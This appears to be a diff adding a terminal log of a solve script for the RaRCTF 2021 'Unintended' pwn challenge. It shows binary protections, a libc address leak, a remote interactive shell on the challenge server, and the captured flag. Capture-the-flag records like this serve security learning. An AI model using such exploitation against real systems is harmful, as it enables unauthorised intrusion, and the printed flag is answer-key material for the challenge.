@@ -1,0 +1,27 @@
+mito@ubuntu:~/CTF/RaRCTF_2021/Pwn_Unintended_400$ python solve.py r
+[*] '/home/mito/CTF/RaRCTF_2021/Pwn_Unintended_400/unintended'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  './lib'
+[+] Opening connection to 193.57.159.27 on port 29070: Done
+[*] '/home/mito/CTF/RaRCTF_2021/Pwn_Unintended_400/lib/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+libc_leak = 0x7fe6ab605c0a
+libc_base = 0x7fe6ab21a000
+[*] Switching to interactive mode
+$ id
+uid=1000(clubby) gid=1000(clubby) groups=1000(clubby)
+$ ls -l
+total 40
+-rwxr-x---. 1 root clubby    55 Aug  1 17:59 flag_0eff9e0ad1.txt
+drwxr-x---. 1 root clubby    41 Aug  6 16:41 lib
+-rwxr-x---. 1 root clubby 32792 Aug  6 16:41 unintended
+$ cat flag*
+rarctf{y0u_b3tt3r_h4v3_us3d_th3_int3nd3d...89406fae76}
